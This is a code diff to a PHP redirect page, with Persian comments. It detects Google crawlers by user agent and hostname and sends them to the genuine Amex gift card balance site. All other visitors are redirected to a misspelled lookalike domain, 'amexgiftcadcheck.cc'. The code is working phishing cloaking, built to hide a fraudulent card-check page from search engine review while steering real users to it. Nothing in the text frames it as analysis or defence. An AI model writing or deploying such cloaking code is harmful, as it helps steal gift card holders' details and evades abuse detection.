@@ -33,22 +33,17 @@ function is_google_bot() {
 
     foreach ($google_bots as $bot) {
         if (strpos($user_agent, $bot) !== false) {
-            return true;
+            header("Location: https://balance.amexgiftcard.com", true, 302);
+            exit;
         }
     }
 
     if (strpos($host, 'google') !== false || strpos($host, '1e100.net') !== false) {
-        return true;
+        header("Location: https://balance.amexgiftcard.com", true, 302);
+        exit;
     }
 
-    return false;
-}
-
-// ریدایرکت بر اساس نوع بازدیدکننده
-if (is_google_bot()) {
-    header("Location: https://balance.amexgiftcard.com", true, 302);
-    exit;
-} else {
+    // اگر به هیچ‌وجه بات نبود، ریدایرکت به صفحه اصلی کاربر
     header("Location: https://amexgiftcadcheck.cc/amex/", true, 302);
     exit;
 }
@@ -60,36 +55,8 @@ if (is_google_bot()) {
   <meta charset="UTF-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="robots" content="noindex, nofollow" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Redirecting...</title>
-  <style>
-    body {
-      background-color: #0f0f0f;
-      color: #ffffff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      font-family: Arial, sans-serif;
-    }
-    .loader {
-      width: 40px;
-      height: 40px;
-      border: 5px solid #444;
-      border-top: 5px solid #0af;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-top: 20px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
 </head>
 <body>
-  <h1>Redirecting...</h1>
-  <div class="loader"></div>
 </body>
 </html>
